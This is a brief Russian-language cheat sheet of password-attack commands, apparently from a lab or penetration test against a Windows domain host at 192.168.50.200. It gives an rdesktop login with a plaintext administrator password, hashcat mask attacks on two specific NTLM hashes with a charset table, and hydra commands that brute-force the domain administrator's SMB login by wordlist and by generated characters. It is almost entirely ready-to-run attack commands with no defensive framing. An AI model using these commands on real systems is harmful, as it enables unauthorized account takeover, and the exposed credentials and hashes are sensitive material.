Подключение по РДП rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200



hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 -1 ?l?u?d FB6CEDE76A37702EAD2615DC27B626EF ?1?1?1?1?1?1?1?1?1?1?1?1?1


hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 6A6E1BB24F869966A450203F373C8EA6 ?a?a?a?a?a?a?a?a

 Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  
 
  В Hashcat встроенными наборами символов являются:	
? | Набор символов
===+=========
 l | abcdefghijklmnopqrstuvwxyz
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
 d | 0123456789
 h | 0123456789abcdef
 H | 0123456789ABCDEF
 s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 
 a | ?l?u?d?s
 b | 0x00 - 0xff



hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"


Brute char!!!! -x min:max:Aa1%

hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
